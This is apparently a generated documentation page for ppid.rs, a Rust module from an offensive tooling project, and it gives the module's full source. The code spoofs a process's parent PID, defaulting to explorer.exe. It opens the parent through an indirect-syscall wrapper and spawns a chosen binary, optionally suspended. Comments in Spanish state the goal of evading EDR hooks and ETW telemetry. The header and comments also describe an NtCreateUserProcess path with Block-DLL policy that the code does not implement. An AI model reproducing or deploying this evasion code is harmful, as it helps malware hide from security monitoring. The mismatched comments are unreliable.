# crowd — ppid.rs  (🔥 S TIER — NtOpenProcess + NtClose via RecycledGate, CreateProcessW irreducible)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/ppid.rs` |
| **Lines** | 275 |
| **Tier** | N |
| **Cards** | T007-process-injection, T009-edr-evasion |
| **Role** | PPID spoofing |
| **Unsafe blocks** | 4 |

## Purpose

# crowd — ppid.rs  (🔥 S TIER — NtOpenProcess + NtClose via RecycledGate, CreateProcessW irreducible)

## PPID Spoofing via NtCreateUserProcess

Lanza procesos con un padre falso usando `NtCreateUserProcess` directamente
(no `CreateProcessW` — menor footprint Win32, sin hooks en CreateProcess layer).

### Por qué NtCreateUserProcess y no CreateProcessW
- `CreateProcessW` está monitoreada por prácticamente todos los EDRs.
- `NtCreateUserProcess` es el syscall subyacente — si el EDR está hookando
CreateProcess el hook llama a NtCreateUserProcess; ir directo evita el hook.
- Menos eventos ETW del Win32 subsystem se generan.

### Implementación
`NtCreateUserProcess` requiere llenar manualmente varias estructuras NT:
- `RTL_USER_PROCESS_PARAMETERS` via `RtlCreateProcessParametersEx`
- `PS_CREATE_INFO` (resultado de creación)
- `PS_ATTRIBUTE_LIST` con los atributos extendidos

Para el PPID spoof, el atributo `PS_ATTRIBUTE_PARENT_PROCESS` (valor 0x60000)
se agrega al `PS_ATTRIBUTE_LIST` con un handle al proceso padre falso.

El proceso se crea en estado **SUSPENDED** con `Block-DLL-Policy** aplicado.
`find_pid_by_name` sigue disponible para obtener el PID de explorer.exe.

## Constants

- `PS_ATTRIBUTE_PARENT_PROCESS`: `usize` = `0x0006_0000` — PsAttributeParentProcess
- `PS_ATTRIBUTE_IMAGE_NAME`: `usize` = `0x0002_0000` — PsAttributeImageName
- `PS_STD_HANDLE_STATE_ENABLED`: `u32` = `0x4`
- `PROCESS_CREATE_PROCESS`: `u32` = `0x0080`

## Types

### struct `PsAttribute` (line 58)

### struct `PsAttributeList` (line 66)

### struct `PsCreateInfo` (line 72)

### struct `ObjectAttributes` (line 162)

### struct `PBI` (line 260)

## Public API

### `find_pid_by_name` (line 88)
```rust
pub fn find_pid_by_name(target: &str) -> Option<u32>
```
Encuentra el PID del primer proceso con el nombre dado (e.g. `explorer.exe`).

### `spawn_with_ppid_spoof` (line 135)
```rust
pub fn spawn_with_ppid_spoof(
```
Lanza un proceso con PPID spoof usando NtCreateUserProcess directamente.

# Parámetros
- `image_path`:   path NT del binario a lanzar (ej. `\\??\\C:\\Windows\\...\\svchost.exe`)
- `parent_pid`:   PID del padre falso (0 = auto explorer.exe)
- `suspend`:      si true, el proceso empieza suspendido (NtResumeThread para reanudar)

# Returns
`(h_process, h_thread)` — ambos handles son propiedad del caller.

### `spawn_background_with_ppid` (line 255)
```rust
pub fn spawn_background_with_ppid(image_path: &str, parent_pid: u32) -> Result<u32>
```
Versión simplificada: lanza un proceso y cierra sus handles.
Útil cuando sólo se necesita el PPID spoof sin controlar el proceso.

## Key Dependencies

- `use anyhow::{anyhow, Result};`
- `use winapi::shared::{`
- `use winapi::um::{`
- `use ntapi::ntpsapi::{NtCreateUserProcess, PROCESS_CREATE_FLAGS_SUSPENDED};`
- `use ntapi::ntrtl::{`
- `use winapi::um::processthreadsapi::{`
- `use winapi::um::winbase::{EXTENDED_STARTUPINFO_PRESENT, STARTUPINFOEXW};`

## Full Source

```rust
//! # crowd — ppid.rs  (🔥 S TIER — NtOpenProcess + NtClose via RecycledGate, CreateProcessW irreducible)
//!
//! ## PPID Spoofing via NtCreateUserProcess
//!
//! Lanza procesos con un padre falso usando `NtCreateUserProcess` directamente
//! (no `CreateProcessW` — menor footprint Win32, sin hooks en CreateProcess layer).
//!
//! ### Por qué NtCreateUserProcess y no CreateProcessW
//! - `CreateProcessW` está monitoreada por prácticamente todos los EDRs.
//! - `NtCreateUserProcess` es el syscall subyacente — si el EDR está hookando
//!   CreateProcess el hook llama a NtCreateUserProcess; ir directo evita el hook.
//! - Menos eventos ETW del Win32 subsystem se generan.
//!
//! ### Implementación
//! `NtCreateUserProcess` requiere llenar manualmente varias estructuras NT:
//!   - `RTL_USER_PROCESS_PARAMETERS` via `RtlCreateProcessParametersEx`
//!   - `PS_CREATE_INFO` (resultado de creación)
//!   - `PS_ATTRIBUTE_LIST` con los atributos extendidos
//!
//! Para el PPID spoof, el atributo `PS_ATTRIBUTE_PARENT_PROCESS` (valor 0x60000)
//! se agrega al `PS_ATTRIBUTE_LIST` con un handle al proceso padre falso.
//!
//! El proceso se crea en estado **SUSPENDED** con `Block-DLL-Policy** aplicado.
//! `find_pid_by_name` sigue disponible para obtener el PID de explorer.exe.

#![allow(dead_code, non_snake_case)]

use anyhow::{anyhow, Result};
use std::mem::{size_of, zeroed};
use std::ptr::null_mut;
use winapi::shared::{
    minwindef::FALSE,
    ntdef::{
        HANDLE, NT_SUCCESS,
        UNICODE_STRING,
    },
};
use winapi::um::{
    tlhelp32::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
        PROCESSENTRY32W, TH32CS_SNAPPROCESS,
    },
};
use ntapi::ntpsapi::{NtCreateUserProcess, PROCESS_CREATE_FLAGS_SUSPENDED};
use ntapi::ntrtl::{
    RtlCreateProcessParametersEx, RtlInitUnicodeString,
    PRTL_USER_PROCESS_PARAMETERS, RTL_USER_PROC_PARAMS_NORMALIZED,
};

// ── PS_ATTRIBUTE / PS_CREATE_INFO structures ──────────────────────────────────
// These are NT-internal structures not in ntapi crate at this version.

const PS_ATTRIBUTE_PARENT_PROCESS: usize = 0x0006_0000;    // PsAttributeParentProcess
const PS_ATTRIBUTE_IMAGE_NAME:      usize = 0x0002_0000;    // PsAttributeImageName
const PS_STD_HANDLE_STATE_ENABLED:  u32   = 0x4;

#[repr(C)]
struct PsAttribute {
    attribute:  usize,
    size:       usize,
    value:      usize,
    return_len: *mut usize,
}

#[repr(C)]
struct PsAttributeList {
    total_length: usize,
    attributes:   [PsAttribute; 3], // max 3 for our use
}

#[repr(C)]
struct PsCreateInfo {
    size:  usize,
    state: u32,       // PsCreateInitialState = 0
    // union — only InitState used for creation
    init: PsCreateInfoInit,
}

#[repr(C)]
union PsCreateInfoInit {
    flags: u32,
    ptr:   usize,
}

// ── Public: find PID by name ──────────────────────────────────────────────────

/// Encuentra el PID del primer proceso con el nombre dado (e.g. `explorer.exe`).
pub fn find_pid_by_name(target: &str) -> Option<u32> {
    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap == winapi::um::handleapi::INVALID_HANDLE_VALUE {
            return None;
        }
        let mut entry: PROCESSENTRY32W = zeroed();
        entry.dwSize = size_of::<PROCESSENTRY32W>() as u32;

        let mut found = None;
        if Process32FirstW(snap, &mut entry) != 0 {
            loop {
                let name: String = entry
                    .szExeFile
                    .iter()
                    .take_while(|&&c| c != 0)
                    .map(|&c| char::from_u32(c as u32).unwrap_or('?'))
                    .collect();

                if name.eq_ignore_ascii_case(target) {
                    found = Some(entry.th32ProcessID);
                    break;
                }

                entry = zeroed();
                entry.dwSize = size_of::<PROCESSENTRY32W>() as u32;
                if Process32NextW(snap, &mut entry) == 0 {
                    break;
                }
            }
        }
        crate::recycled::nt_close(snap as usize);
        found
    }
}

// ── Public: spawn_with_ppid_spoof ─────────────────────────────────────────────

/// Lanza un proceso con PPID spoof usando NtCreateUserProcess directamente.
///
/// # Parámetros
/// - `image_path`:   path NT del binario a lanzar (ej. `\\??\\C:\\Windows\\...\\svchost.exe`)
/// - `parent_pid`:   PID del padre falso (0 = auto explorer.exe)
/// - `suspend`:      si true, el proceso empieza suspendido (NtResumeThread para reanudar)
///
/// # Returns
/// `(h_process, h_thread)` — ambos handles son propiedad del caller.
pub fn spawn_with_ppid_spoof(
    image_path: &str,
    mut parent_pid: u32,
    suspend: bool,
) -> Result<(HANDLE, HANDLE)> {
    use winapi::um::processthreadsapi::{
        InitializeProcThreadAttributeList, UpdateProcThreadAttribute,
        DeleteProcThreadAttributeList, CreateProcessW,
        PROCESS_INFORMATION,
    };
    use winapi::um::winbase::{EXTENDED_STARTUPINFO_PRESENT, STARTUPINFOEXW};
    use std::ptr::null_mut;

    unsafe {
        if parent_pid == 0 {
            parent_pid = find_pid_by_name("explorer.exe")
                .ok_or_else(|| anyhow!("explorer.exe not found for PPID spoof"))?;
        }

        // NtOpenProcess via RecycledGate (no Win32 OpenProcess)
        const PROCESS_CREATE_PROCESS: u32 = 0x0080;
        let mut h_parent_usize: usize = 0;
        {
            let mut cid = [parent_pid as usize, 0usize];
            // OBJECT_ATTRIBUTES: Length is ULONG (u32), not usize.
            // Use a properly-sized repr(C) layout: [u32 Length][u32 pad][5 * usize fields]
            #[repr(C)]
            struct ObjectAttributes {
                length: u32,
                _pad: u32,
                root_directory: usize,
                object_name: usize,
                attributes: u32,
                _pad2: u32,
                security_descriptor: usize,
                security_qos: usize,
            }
            let mut oa: ObjectAttributes = std::mem::zeroed();
            oa.length = std::mem::size_of::<ObjectAttributes>() as u32;
            let st = crate::recycled::nt_open_process(
                &mut h_parent_usize, PROCESS_CREATE_PROCESS,
                &mut oa as *mut ObjectAttributes as *mut std::ffi::c_void,
                cid.as_mut_ptr() as *mut std::ffi::c_void,
            );
            if st != 0 || h_parent_usize == 0 {
                return Err(anyhow!("NtOpenProcess(parent PID={}) failed: 0x{:x}", parent_pid, st as u32));
            }
        }
        let h_parent = h_parent_usize as HANDLE;

        let mut size: usize = 0;
        InitializeProcThreadAttributeList(null_mut(), 1, 0, &mut size);
        if size == 0 {
            crate::recycled::nt_close(h_parent_usize);
            return Err(anyhow!("InitializeProcThreadAttributeList size query failed"));
        }

        let mut attr_list: Vec<u8> = vec![0; size];
        let p_attr_list = attr_list.as_mut_ptr() as *mut _;

        if InitializeProcThreadAttributeList(p_attr_list, 1, 0, &mut size) == FALSE {
            crate::recycled::nt_close(h_parent_usize);
            return Err(anyhow!("InitializeProcThreadAttributeList failed"));
        }

        let mut h_parent_copy = h_parent;
        if UpdateProcThreadAttribute(
            p_attr_list,
            0,
            0x00020000, // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
            &mut h_parent_copy as *mut _ as *mut _,
            size_of::<HANDLE>(),
            null_mut(),
            null_mut(),
        ) == FALSE {
            DeleteProcThreadAttributeList(p_attr_list);
            crate::recycled::nt_close(h_parent_usize);
            return Err(anyhow!("UpdateProcThreadAttribute failed"));
        }

        let mut wide_cmd: Vec<u16> = image_path.encode_utf16().collect();
        wide_cmd.push(0);

        let mut si = zeroed::<STARTUPINFOEXW>();
        si.StartupInfo.cb = size_of::<STARTUPINFOEXW>() as u32;
        si.lpAttributeList = p_attr_list;

        let mut pi = zeroed::<PROCESS_INFORMATION>();
        let mut flags = EXTENDED_STARTUPINFO_PRESENT;
        if suspend {
            flags |= 0x00000004; // CREATE_SUSPENDED
        }

        let success = CreateProcessW(
            null_mut(),
            wide_cmd.as_mut_ptr(),
            null_mut(),
            null_mut(),
            FALSE,
            flags,
            null_mut(),
            null_mut(),
            &mut si.StartupInfo,
            &mut pi,
        );

        // Cleanup: always delete the attribute list after process creation
        DeleteProcThreadAttributeList(p_attr_list);
        crate::recycled::nt_close(h_parent_usize);

        if success == FALSE {
            return Err(anyhow!("CreateProcessW failed with EXTENDED_STARTUPINFO_PRESENT"));
        }

        Ok((pi.hProcess, pi.hThread))
    }
}

/// Versión simplificada: lanza un proceso y cierra sus handles.
/// Útil cuando sólo se necesita el PPID spoof sin controlar el proceso.
pub fn spawn_background_with_ppid(image_path: &str, parent_pid: u32) -> Result<u32> {
    let (h_proc, h_thread) = spawn_with_ppid_spoof(image_path, parent_pid, false)?;
    // NtQueryInformationProcess → PID (no Win32 GetProcessId)
    let pid = unsafe {
        #[repr(C)]
        struct PBI { _pad: [usize; 4], unique_pid: usize, _inh: usize }
        let mut pbi: PBI = std::mem::zeroed();
        let mut ret_len: u32 = 0;
        let st = crate::recycled::nt_query_information_process(
            h_proc as usize, 0,
            &mut pbi as *mut PBI as *mut u8,
            std::mem::size_of::<PBI>() as u32, &mut ret_len,
        );
        if st == 0 { pbi.unique_pid as u32 } else { 0u32 }
    };
    unsafe {
        crate::recycled::nt_close(h_proc as usize);
        crate::recycled::nt_close(h_thread as usize);
    }
    Ok(pid)
}

```